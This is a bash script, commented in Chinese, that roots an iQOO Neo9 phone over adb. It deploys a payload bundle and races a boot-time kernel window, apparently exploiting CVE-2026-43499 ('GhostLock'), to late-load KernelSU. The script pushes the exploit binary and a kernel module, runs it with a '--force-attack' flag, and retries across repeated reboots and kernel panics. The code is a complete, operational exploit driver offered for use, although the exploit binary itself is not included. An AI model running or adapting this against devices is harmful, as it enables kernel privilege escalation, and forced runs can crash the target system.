#!/usr/bin/env bash
# ============================================================================
# reroot.sh —— iQOO Neo9 (PD2338) 一键（重新）root   【脚本 + 一个二进制】
#
#   需要的东西只有两个文件，放在同一个目录：
#       reroot.sh          本脚本（纯 bash + adb，无 python 依赖）
#       ghostlock.bin      payload 包：libghostlock.so + vrpatch.ko + profile.bin
#
#   原理：GhostLock (CVE-2026-43499) 是**开机窗口竞争**，命中窗口约 boot 后 12~45 秒，
#         所以流程 = 重启 -> 一有 adb shell 立刻发射 -> 盯 root 脚本日志
#         -> 看到 "KernelSU module loaded" 立即停手（late-load 只在内存里，别重启）。
#
#   用法：
#     ./reroot.sh                 # 最多 10 轮
#     ./reroot.sh 20              # 最多 20 轮
#     ./reroot.sh --no-reboot     # 设备刚重启过 / 手动重启完：直接抢窗口
#     ./reroot.sh --check         # 只看状态，不重启
#     ./reroot.sh --inspect       # 看包内容
#     ./reroot.sh --deploy        # 只布署 payload，不打
#     ./reroot.sh --check-payload # 只看设备上的 payload 是否已就绪
#     ./reroot.sh --redeploy      # 强制重推 payload
#     ./reroot.sh --force         # release 不匹配也硬打（会风险 panic，慎用）
# ============================================================================
set -u

D="${GL_DIR:-/data/local/tmp/ghostlock-app}"
HERE="$(cd "$(dirname "$0")" && pwd)"
PACK="$HERE/ghostlock.bin"
TIMEOUT="${TIMEOUT:-180}"
PER_BOOT="${PER_BOOT:-6}"
WINDOW="${WINDOW:-90}"

ROUNDS=10
NO_REBOOT=0
CHECK_ONLY=0
INSPECT=0
DEPLOY_ONLY=0
CHECK_PAYLOAD=0
REDEPLOY=0
FORCE=0

for a in "$@"; do
  case "$a" in
    --no-reboot) NO_REBOOT=1 ;;
    --check)     CHECK_ONLY=1 ;;
    --inspect)   INSPECT=1 ;;
    --redeploy)  REDEPLOY=1 ;;
    --deploy)    DEPLOY_ONLY=1 ;;
    --check-payload) CHECK_PAYLOAD=1 ;;
    --force)     FORCE=1 ;;
    --pack)      shift ;;
    *.bin)       PACK="$a" ;;
    ''|*[!0-9]*) ;;
    *)           ROUNDS="$a" ;;
  esac
done
# --pack <path> 形式
prev=""
for a in "$@"; do
  [ "$prev" = "--pack" ] && PACK="$a"
  prev="$a"
done

say() { printf '%s\n' "$*"; }
die() { say "[!] $*"; exit 2; }

# ---------------------------------------------------------------- 容器解析
read_pack() {
  [ -f "$PACK" ] || die "找不到 payload 包：$PACK（应与本脚本同目录）"
  [ "$(dd if="$PACK" bs=8 count=1 2>/dev/null | tr -d '\0')" = "GLPACK01" ] \
    || die "不是 GLPACK 包：$PACK"
  P_DATA="$(od -An -tu8 -j8 -N8 "$PACK" | tr -d ' ')"
  P_N="$(od -An -tu4 -j16 -N4 "$PACK" | tr -d ' ')"
}

# entry i -> $E_NAME $E_OFF $E_SIZE
entry() {
  local base=$(( 24 + $1 * 32 ))
  E_OFF="$(od -An -tu8 -j$base -N8 "$PACK" | tr -d ' ')"
  E_SIZE="$(od -An -tu8 -j$(( base + 8 )) -N8 "$PACK" | tr -d ' ')"
  E_NAME="$(dd if="$PACK" bs=1 skip=$(( base + 16 )) count=16 2>/dev/null | tr -d '\0')"
}

extract() {  # extract <name> <dest>
  local i
  for i in $(seq 0 $(( P_N - 1 ))); do
    entry "$i"
    if [ "$E_NAME" = "$1" ]; then
      dd if="$PACK" of="$2" bs=64k skip=$(( P_DATA + E_OFF )) count="$E_SIZE" \
         iflag=skip_bytes,count_bytes 2>/dev/null || return 1
      return 0
    fi
  done
  return 1
}

do_inspect() {
  read_pack
  say "包：$PACK  ($(wc -c < "$PACK") B, $P_N 个条目)"
  local i
  for i in $(seq 0 $(( P_N - 1 ))); do
    entry "$i"
    if [ "$E_NAME" = "release.txt" ]; then
      say "  $(printf '%-18s' "$E_NAME") $(printf '%8s' "$E_SIZE") B   $(dd if="$PACK" bs=1 skip=$(( P_DATA + E_OFF )) count=$E_SIZE 2>/dev/null | tr -d '\n\0')"
    else
      say "  $(printf '%-18s' "$E_NAME") $(printf '%8s' "$E_SIZE") B"
    fi
  done
}

# ---------------------------------------------------------------- adb 小工具
sho() { timeout 8 adb shell "$1" 2>/dev/null | tr -d '\r'; }
uptime_s() { sho 'cut -d" " -f1 /proc/uptime' | head -n1; }
dev_size() { sho "wc -c < $D/$1" | tr -d ' '; }

is_root() {
  local u
  u="$(timeout 6 adb shell 'su -c id -u' 2>/dev/null | tr -d '\r\n ')"
  [ "$u" = "0" ]
}

show_status() {
  say "当前状态："
  say "  id      : $(sho id)"
  say "  kernelsu: $(sho 'grep -c kernelsu /proc/modules')   （1=已加载）"
  say "  selinux : $(sho getenforce)"
  say "  su      : $(timeout 6 adb shell 'su -c id' 2>/dev/null | tr -d '\r')"
}

wait_shell() {
  local i
  for i in $(seq 1 750); do
    if adb shell 'echo up' 2>/dev/null | grep -q up; then return 0; fi
    sleep 0.4
  done
  return 1
}

gen_glrun() {  # gen_glrun <dest>
  cat > "$1" <<EOS
#!/system/bin/sh
H="$D"
cd "\$H" || exit 90
TS=\${GL_RUN_ID:-\$(date +%s)}
export HOME="\$H" TMPDIR="\$H" GHOSTLOCK_HOME="\$H"
export GHOSTLOCK_VRPATCH_KO="\$H/vrpatch.ko"
export GHOSTLOCK_KSU_LOG="\$H/ksu-\$TS.log"
echo "=== run \$TS uptime=\$(cut -d' ' -f1 /proc/uptime)" > "\$H/native-\$TS.log"
"\$H/libghostlock.so" --load-prebuilt-profile "\$H/profile.bin" --force-attack >> "\$H/native-\$TS.log" 2>&1
echo "=== native exit=\$?" >> "\$H/native-\$TS.log"
echo done > "\$H/native-\$TS.rc"
EOS
}

# ---------------------------------------------------------------- 部署
need_deploy() {
  [ "$REDEPLOY" = 1 ] && return 0
  read_pack
  local f want have
  for f in libghostlock.so vrpatch.ko profile.bin; do
    extract "$f" /dev/null 2>/dev/null
    want="$E_SIZE"
    have="$(dev_size "$f")"
    [ "$have" = "$want" ] || return 0
  done
  [ "$(sho "test -f $D/glrun.sh && echo y")" = "y" ] || return 0
  return 1
}

deploy() {
  local tmp; tmp="$(mktemp -d)"
  read_pack

  local f
  for f in libghostlock.so vrpatch.ko profile.bin; do
    extract "$f" "$tmp/$f" || { rm -rf "$tmp"; die "包里没有 $f"; }
  done
  extract release.txt "$tmp/release.txt" || { rm -rf "$tmp"; die "包里没有 release.txt"; }
  local rel; rel="$(tr -d '\r\n' < "$tmp/release.txt")"

  gen_glrun "$tmp/glrun.sh"

  local dev_rel; dev_rel="$(sho 'uname -r')"
  if [ "$rel" != "$dev_rel" ]; then
    say "[!] release 不匹配："
    say "    设备 uname -r : $dev_rel"
    say "    包内 release  : $rel"
    if [ "$FORCE" = 1 ]; then
      say "[!] --force：继续（offset 不对会 panic 重启，设备能自行恢复）"
    else
      rm -rf "$tmp"
      die "拒绝执行。确认包是对的再加 --force。"
    fi
  fi

  say "[*] 部署 payload 到 $D"
  timeout 20 adb shell "mkdir -p $D" >/dev/null 2>&1
  for f in libghostlock.so vrpatch.ko profile.bin glrun.sh; do
    timeout 90 adb push "$tmp/$f" "$D/$f" >/dev/null 2>&1 || { rm -rf "$tmp"; die "push $f 失败"; }
  done
  timeout 20 adb shell "chmod 755 $D/libghostlock.so $D/glrun.sh; chmod 644 $D/profile.bin $D/vrpatch.ko" >/dev/null 2>&1
  rm -rf "$tmp"
  say "[*] 部署完成（release=$rel）"
}

# ---------------------------------------------------------------- 主流程
[ "$INSPECT" = 1 ] && { do_inspect; exit 0; }

if ! adb devices 2>/dev/null | grep -q "device"; then
  say "[!] 没看到 adb 设备。先插线 / 开 USB 调试 / 授权这台电脑。"
  exit 3
fi

if [ "$CHECK_PAYLOAD" = 1 ]; then
  if need_deploy; then say "payload 未就绪（下次运行会推送）"; else say "payload 已就绪（大小与包内一致，不会重推）"; fi
  exit 0
fi

[ "$DEPLOY_ONLY" = 1 ] && { deploy; exit 0; }

if is_root; then
  say "[+] 已经是 root（su 可用），不用再打。"
  show_status
  exit 0
fi

if [ "$CHECK_ONLY" = 1 ]; then
  show_status
  exit 0
fi

need_deploy && deploy

say "[i] 最多 $ROUNDS 轮，每轮窗口内最多 $PER_BOOT 次；判据 = ksu 日志 'KernelSU module loaded'"

WIN=0
for r in $(seq 1 "$ROUNDS"); do
  say ""
  say "================ 第 $r/$ROUNDS 轮 ================"

  if [ "$NO_REBOOT" = 0 ]; then
    say "[*] adb reboot"
    timeout 20 adb reboot >/dev/null 2>&1
    sleep 2
  fi

  if ! wait_shell; then
    say "[!] 300 秒内没等到 adb shell，再来一轮"
    continue
  fi
  say "[i] 拿到 shell：uptime=$(uptime_s) 秒（12~45 秒最容易中，>60 秒基本 Write 1 failed）"

  DROPPED=0
  for n in $(seq 1 "$PER_BOOT"); do
    up="$(uptime_s)"; upi="${up%%.*}"
    if [ -n "$upi" ] && [ "$upi" -gt "$WINDOW" ] 2>/dev/null; then
      say "[i] uptime=${up}s 超出窗口 ${WINDOW}s，准备下一轮"
      break
    fi
    say "---- 第 $r 轮 / 第 $n 次（uptime=${up}s）----"

    ts="$(date +%s)-$r-$n"
    timeout 25 adb shell "cd $D && GL_RUN_ID=$ts setsid sh $D/glrun.sh </dev/null >/dev/null 2>&1 & echo go" >/dev/null 2>&1

    end=$(( $(date +%s) + TIMEOUT ))
    klog=""
    while [ "$(date +%s)" -lt "$end" ]; do
      sleep 0.7
      if ! adb shell 'echo up' 2>/dev/null | grep -q up; then
        DROPPED=1
        say "[!] 设备掉线（panic/重启）——正常失败路径，等它回来"
        break
      fi
      klog="$(adb shell "cat $D/ksu-$ts.log 2>/dev/null" 2>/dev/null | tr -d '\r')"
      case "$klog" in *"KernelSU module loaded"*) WIN=1 ;; esac
      [ "$WIN" = 1 ] && break
      case "$klog" in
        *"fixup failed"*|*"KernelSU module not loaded"*|*"ksud missing"*) break ;;
      esac
      # native 自己退了（W1 没中）→ 别占窗口，立刻再来一次
      if [ "$(sho "test -f $D/native-$ts.rc && echo y")" = "y" ]; then break; fi
    done

    [ "$WIN" = 1 ] && break
    [ "$DROPPED" = 1 ] && break
    say "    native: $(adb shell "tail -n 3 $D/native-$ts.log 2>/dev/null" 2>/dev/null | tr -d '\r' | sed 's/\x1b\[[0-9;]*m//g' | tr '\n' ' ' | cut -c1-150)"
    [ -n "$klog" ] && say "    root脚本: $(printf '%s' "$klog" | tail -n 2 | tr '\n' ' ' | cut -c1-150)"
  done

  [ "$WIN" = 1 ] && break
  if [ "$DROPPED" = 1 ]; then
    NO_REBOOT=0
  elif [ "$NO_REBOOT" = 1 ]; then
    say "[i] --no-reboot：窗口已过，请手动重启后再跑"
    break
  fi
done

say ""
if [ "$WIN" = 1 ] || is_root; then
  say "[+] 成功：root 已在（KernelSU late-load）"
  show_status
  say ""
  say "用法：  adb shell su -c 'id'"
  say "注意：  late-load 只在内存里 —— 硬重启就没了，重启后重跑本脚本；"
  say "        vrpatch.ko 的补丁在软重启后存活。"
  exit 0
else
  say "[-] 这轮没中。再跑一次（概率问题；作者单轮约 43 秒，也是多轮才稳）。"
  say "    连续很多次不中时，作者的经验：恢复出厂设置可以恢复命中率。"
  exit 1
fi
